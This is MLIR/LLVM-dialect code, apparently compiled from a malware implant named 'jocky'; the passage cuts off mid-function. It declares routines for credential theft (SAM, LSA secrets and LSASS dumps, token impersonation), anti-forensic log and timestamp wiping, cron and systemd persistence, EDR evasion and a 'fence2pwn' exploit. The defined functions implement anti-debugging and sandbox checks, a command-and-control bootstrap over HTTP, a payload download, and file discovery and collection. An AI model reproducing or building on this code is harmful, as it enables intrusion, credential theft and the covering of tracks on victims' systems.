  llvm.func @jocky_ftrace_attach(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_ftrace_detach(!llvm.ptr) -> i32
  llvm.func @jocky_http_get(!llvm.ptr, !llvm.ptr, i64) -> i64
  llvm.func @jocky_http_post(!llvm.ptr, !llvm.ptr, i32, !llvm.ptr) -> i1
  llvm.func @jocky_download_file(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_compress_data(!llvm.ptr, i32) -> !llvm.ptr
  llvm.func @jocky_decompress_data(!llvm.ptr, i32) -> !llvm.ptr
  llvm.func @jocky_registry_enum_keys(i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_registry_enum_values(i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_registry_get_value(i32, !llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_registry_dump_sam() -> i32
  llvm.func @jocky_registry_dump_security() -> i32
  llvm.func @jocky_registry_dump_lsa_secrets() -> i32
  llvm.func @jocky_registry_delete_key(i32, !llvm.ptr) -> i1
  llvm.func @jocky_wipe_jumplist() -> i1
  llvm.func @jocky_wipe_thumbcache() -> i1
  llvm.func @jocky_clear_recent_files() -> i1
  llvm.func @jocky_clear_mft_timestamps() -> i1
  llvm.func @jocky_wipe_free_space() -> i1
  llvm.func @jocky_wipe_temp_files(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_clear_browser_cache(!llvm.ptr) -> i1
  llvm.func @jocky_clear_browser_history(!llvm.ptr) -> i1
  llvm.func @jocky_cron_install(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_systemd_install(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_cron_remove(!llvm.ptr) -> i1
  llvm.func @jocky_systemd_remove(!llvm.ptr) -> i1
  llvm.func @jocky_linux_cleanup_audit() -> i32
  llvm.func @jocky_linux_cleanup_wtmp() -> i32
  llvm.func @jocky_linux_cleanup_lastlog() -> i32
  llvm.func @jocky_thread_get_info(i32) -> !llvm.ptr
  llvm.func @jocky_module_info(!llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_fence2pwn_spray() -> i1
  llvm.func @jocky_fence2pwn_trigger() -> i1
  llvm.func @jocky_fence2pwn_verify_spray() -> i1
  llvm.func @jocky_lsass_dump() -> i32
  llvm.func @jocky_credentials_enumerate() -> !llvm.ptr
  llvm.func @jocky_token_enumerate() -> !llvm.ptr
  llvm.func @jocky_impersonate_user(!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_data_base64_encode(!llvm.ptr, i32) -> !llvm.ptr
  llvm.func @jocky_data_base64_decode(!llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_data_hex_encode(!llvm.ptr, i32) -> !llvm.ptr
  llvm.func @jocky_data_hex_decode(!llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_ai_init() -> i1
  llvm.func @jocky_ai_get_threat_level() -> i32
  llvm.func @jocky_driver_score_composite(!llvm.ptr) -> i32
  llvm.func @jocky_driver_select_best(i32) -> !llvm.ptr
  llvm.func @jocky_driver_get_fallback_chain(i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_edr_profiler_init() -> !llvm.ptr
  llvm.func @jocky_edr_profiler_record_callback(!llvm.ptr)
  llvm.func @jocky_edr_profiler_analyze(!llvm.ptr) -> i32
  llvm.func @jocky_edr_get_syscall_delay(i32) -> i32
  llvm.func @jocky_edr_should_reduce_syscalls(i32) -> i1
  llvm.func @jocky_edr_should_batch_operations(i32) -> i1
  llvm.func @jocky_edr_profiler_shutdown(!llvm.ptr)
  llvm.func @phase_anti_analysis() -> i1 {
    %0 = llvm.mlir.addressof @".str.0" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.2" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.3" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.4" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.5" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.6" : !llvm.ptr
    %7 = llvm.mlir.constant(true) : i1
    %8 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %9 = llvm.mlir.constant(false) : i1
    %10 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%10) : (!llvm.ptr) -> ()
    %11 = llvm.call @jocky_is_debugger_present() : () -> i1
    llvm.cond_br %11, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %12 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%12) : (!llvm.ptr) -> ()
    llvm.return %9 : i1
  ^bb2:  // pred: ^bb0
    %13 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @println(%13) : (!llvm.ptr) -> ()
    %14 = llvm.call @jocky_is_vm() : () -> i1
    llvm.cond_br %14, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %15 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    llvm.call @println(%15) : (!llvm.ptr) -> ()
    llvm.call @jocky_sleep_and_recheck() : () -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    %16 = llvm.call @jocky_is_sandbox() : () -> i1
    llvm.cond_br %16, ^bb5, ^bb6
  ^bb5:  // pred: ^bb4
    %17 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%17) : (!llvm.ptr) -> ()
    llvm.br ^bb6
  ^bb6:  // 2 preds: ^bb4, ^bb5
    %18 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    llvm.call @println(%18) : (!llvm.ptr) -> ()
    %19 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%19) : (!llvm.ptr) -> ()
    llvm.return %7 : i1
  }
  llvm.func @phase_c2_bootstrap() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.7" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.8" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.6" : !llvm.ptr
    %5 = llvm.mlir.constant(4096 : i32) : i32
    %6 = llvm.mlir.addressof @".str.10" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.11" : !llvm.ptr
    %8 = llvm.mlir.addressof @cdn_token : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.12" : !llvm.ptr
    %10 = llvm.mlir.addressof @model_path : !llvm.ptr
    %11 = llvm.mlir.constant(true) : i1
    %12 = llvm.mlir.addressof @".str.9" : !llvm.ptr
    %13 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %14 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<42 x i8>
    llvm.call @println(%14) : (!llvm.ptr) -> ()
    %15 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    %16 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %17 = llvm.sext %5 : i32 to i64
    %18 = llvm.call @jocky_http_get(%15, %16, %17) : (!llvm.ptr, !llvm.ptr, i64) -> i64
    llvm.store %18, %13 {alignment = 8 : i64} : i64, !llvm.ptr
    %19 = llvm.load %13 {alignment = 8 : i64} : !llvm.ptr -> i64
    %20 = llvm.sext %2 : i32 to i64
    %21 = llvm.icmp "ne" %19, %20 : i64
    llvm.cond_br %21, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %22 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%22) : (!llvm.ptr) -> ()
    llvm.return %11 : i1
  ^bb2:  // pred: ^bb0
    %23 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%23) : (!llvm.ptr) -> ()
    %24 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    llvm.store %24, %8 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %25 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    llvm.store %25, %10 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %26 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%26) : (!llvm.ptr) -> ()
    llvm.return %11 : i1
  }
  llvm.func @phase_download_model() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.13" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.6" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.16" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.17" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.18" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.19" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.21" : !llvm.ptr
    %9 = llvm.mlir.constant(false) : i1
    %10 = llvm.mlir.addressof @".str.20" : !llvm.ptr
    %11 = llvm.mlir.constant(true) : i1
    %12 = llvm.mlir.addressof @".str.14" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.15" : !llvm.ptr
    %14 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %15 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %16 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    llvm.call @println(%16) : (!llvm.ptr) -> ()
    %17 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %18 = llvm.call @fs_exists(%17) : (!llvm.ptr) -> i1
    llvm.cond_br %18, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %19 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %20 = llvm.call @fs_file_size(%19) : (!llvm.ptr) -> i64
    llvm.store %20, %14 {alignment = 8 : i64} : i64, !llvm.ptr
    %21 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<23 x i8>
    %22 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> i64
    %23 = llvm.call @string(%22) : (i64) -> !llvm.ptr
    %24 = llvm.call @jocky_str_concat(%21, %23) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %25 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %26 = llvm.call @jocky_str_concat(%24, %25) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%26) : (!llvm.ptr) -> ()
    llvm.return %11 : i1
  ^bb2:  // pred: ^bb0
    %27 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%27) : (!llvm.ptr) -> ()
    %28 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %29 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<2 x i8>
    %30 = llvm.call @jocky_str_concat(%28, %29) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %31 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    %32 = llvm.call @jocky_str_concat(%30, %31) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %32, %15 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %33 = llvm.load %15 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %34 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %35 = llvm.call @jocky_download_file(%33, %34) : (!llvm.ptr, !llvm.ptr) -> i1
    llvm.cond_br %35, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %36 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %37 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %38 = llvm.call @jocky_str_concat(%36, %37) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%38) : (!llvm.ptr) -> ()
    llvm.return %11 : i1
  ^bb4:  // pred: ^bb2
    %39 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%39) : (!llvm.ptr) -> ()
    %40 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%40) : (!llvm.ptr) -> ()
    llvm.return %9 : i1
  }
  llvm.func @phase_discover_data() -> i1 {
    %0 = llvm.mlir.addressof @".str.22" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.constant(1 : i32) : i32
    %3 = llvm.mlir.addressof @DATA_PATHS : !llvm.ptr
    %4 = llvm.mlir.constant(0 : i64) : i64
    %5 = llvm.mlir.constant(6 : i64) : i64
    %6 = llvm.mlir.addressof @".str.24" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.25" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.6" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.23" : !llvm.ptr
    %10 = llvm.mlir.constant(1 : i64) : i64
    %11 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @println(%11) : (!llvm.ptr) -> ()
    %12 = llvm.alloca %2 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %1, %12 {alignment = 4 : i64} : i32, !llvm.ptr
    %13 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %14 = llvm.alloca %2 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %4, %14 {alignment = 8 : i64} : i64, !llvm.ptr
    %15 = llvm.alloca %2 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb5
    %16 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> i64
    %17 = llvm.icmp "slt" %16, %5 : i64
    llvm.cond_br %17, ^bb2, ^bb6
  ^bb2:  // pred: ^bb1
    %18 = llvm.bitcast %13 : !llvm.ptr to !llvm.ptr
    %19 = llvm.getelementptr %18[%16] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %20 = llvm.load %19 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %20, %15 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %21 = llvm.load %15 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %22 = llvm.call @fs_exists(%21) : (!llvm.ptr) -> i1
    llvm.cond_br %22, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %23 = llvm.load %12 {alignment = 4 : i64} : !llvm.ptr -> i32
    %24 = llvm.add %23, %2 : i32
    llvm.store %24, %12 {alignment = 4 : i64} : i32, !llvm.ptr
    %25 = llvm.getelementptr %9[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %26 = llvm.load %15 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %27 = llvm.call @jocky_str_concat(%25, %26) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%27) : (!llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    llvm.br ^bb5
  ^bb5:  // pred: ^bb4
    %28 = llvm.add %16, %10 : i64
    llvm.store %28, %14 {alignment = 8 : i64} : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb6:  // pred: ^bb1
    %29 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %30 = llvm.load %12 {alignment = 4 : i64} : !llvm.ptr -> i32
    %31 = llvm.sext %30 : i32 to i64
    %32 = llvm.call @string(%31) : (i64) -> !llvm.ptr
    %33 = llvm.call @jocky_str_concat(%29, %32) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %34 = llvm.getelementptr %7[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    %35 = llvm.call @jocky_str_concat(%33, %34) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%35) : (!llvm.ptr) -> ()
    %36 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%36) : (!llvm.ptr) -> ()
    %37 = llvm.load %12 {alignment = 4 : i64} : !llvm.ptr -> i32
    %38 = llvm.icmp "sgt" %37, %1 : i32
    llvm.return %38 : i1
  }
  llvm.func @phase_collect_data() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.26" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.27" : !llvm.ptr
    %4 = llvm.mlir.constant(true) : i1
    %5 = llvm.mlir.addressof @".str.6" : !llvm.ptr
    %6 = llvm.mlir.addressof @collected_data : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.28" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.15" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.29" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.30" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.31" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.32" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.33" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.34" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.35" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.36" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.37" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.38" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.39" : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.40" : !llvm.ptr
    %21 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %22 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %23 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %24 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %25 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %26 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %27 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    llvm.call @println(%27) : (!llvm.ptr) -> ()
    %28 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %29 = llvm.call @fs_list_files(%28, %4) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.store %29, %21 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %30 = llvm.load %21 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %31 = llvm.call @strlen(%30) : (!llvm.ptr) -> i64
    %32 = llvm.sext %2 : i32 to i64
    %33 = llvm.icmp "sgt" %31, %32 : i64
    llvm.cond_br %33, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %34 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %35 = llvm.load %21 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %36 = llvm.call @jocky_str_concat(%34, %35) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %36, %6 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %37 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %38 = llvm.load %21 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %39 = llvm.call @strlen(%38) : (!llvm.ptr) -> i64
    %40 = llvm.call @string(%39) : (i64) -> !llvm.ptr
    %41 = llvm.call @jocky_str_concat(%37, %40) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %42 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %43 = llvm.call @jocky_str_concat(%41, %42) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%43) : (!llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    %44 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %45 = llvm.call @fs_list_files(%44, %4) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.store %45, %22 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %46 = llvm.load %22 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %47 = llvm.call @strlen(%46) : (!llvm.ptr) -> i64
    %48 = llvm.sext %2 : i32 to i64
    %49 = llvm.icmp "sgt" %47, %48 : i64
    llvm.cond_br %49, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %50 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %51 = llvm.load %22 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %52 = llvm.call @jocky_str_concat(%50, %51) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %52, %6 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %53 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %54 = llvm.load %22 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %55 = llvm.call @strlen(%54) : (!llvm.ptr) -> i64
    %56 = llvm.call @string(%55) : (i64) -> !llvm.ptr
    %57 = llvm.call @jocky_str_concat(%53, %56) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %58 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %59 = llvm.call @jocky_str_concat(%57, %58) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%59) : (!llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    %60 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<5 x i8>
    %61 = llvm.call @fs_list_files(%60, %4) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.store %61, %23 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %62 = llvm.load %23 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %63 = llvm.call @strlen(%62) : (!llvm.ptr) -> i64
    %64 = llvm.sext %2 : i32 to i64
    %65 = llvm.icmp "sgt" %63, %64 : i64
    llvm.cond_br %65, ^bb5, ^bb6
  ^bb5:  // pred: ^bb4
    %66 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %67 = llvm.load %23 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %68 = llvm.call @jocky_str_concat(%66, %67) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %68, %6 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %69 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<15 x i8>
    %70 = llvm.load %23 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %71 = llvm.call @strlen(%70) : (!llvm.ptr) -> i64
    %72 = llvm.call @string(%71) : (i64) -> !llvm.ptr
    %73 = llvm.call @jocky_str_concat(%69, %72) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %74 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %75 = llvm.call @jocky_str_concat(%73, %74) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%75) : (!llvm.ptr) -> ()
    llvm.br ^bb6
  ^bb6:  // 2 preds: ^bb4, ^bb5
    %76 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    %77 = llvm.call @fs_list_files(%76, %4) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.store %77, %24 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %78 = llvm.load %24 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %79 = llvm.call @strlen(%78) : (!llvm.ptr) -> i64
    %80 = llvm.sext %2 : i32 to i64
    %81 = llvm.icmp "sgt" %79, %80 : i64
    llvm.cond_br %81, ^bb7, ^bb8
  ^bb7:  // pred: ^bb6
    %82 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %83 = llvm.load %24 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %84 = llvm.call @jocky_str_concat(%82, %83) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %84, %6 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %85 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %86 = llvm.load %24 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %87 = llvm.call @strlen(%86) : (!llvm.ptr) -> i64
    %88 = llvm.call @string(%87) : (i64) -> !llvm.ptr
    %89 = llvm.call @jocky_str_concat(%85, %88) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %90 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %91 = llvm.call @jocky_str_concat(%89, %90) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%91) : (!llvm.ptr) -> ()
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb6, ^bb7
    %92 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<5 x i8>
    %93 = llvm.call @fs_list_files(%92, %4) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.store %93, %25 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %94 = llvm.load %25 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %95 = llvm.call @strlen(%94) : (!llvm.ptr) -> i64
    %96 = llvm.sext %2 : i32 to i64
    %97 = llvm.icmp "sgt" %95, %96 : i64
    llvm.cond_br %97, ^bb9, ^bb10
  ^bb9:  // pred: ^bb8
    %98 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %99 = llvm.load %25 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %100 = llvm.call @jocky_str_concat(%98, %99) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %100, %6 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %101 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<15 x i8>
    %102 = llvm.load %25 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %103 = llvm.call @strlen(%102) : (!llvm.ptr) -> i64
    %104 = llvm.call @string(%103) : (i64) -> !llvm.ptr
    %105 = llvm.call @jocky_str_concat(%101, %104) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %106 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %107 = llvm.call @jocky_str_concat(%105, %106) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%107) : (!llvm.ptr) -> ()
    llvm.br ^bb10
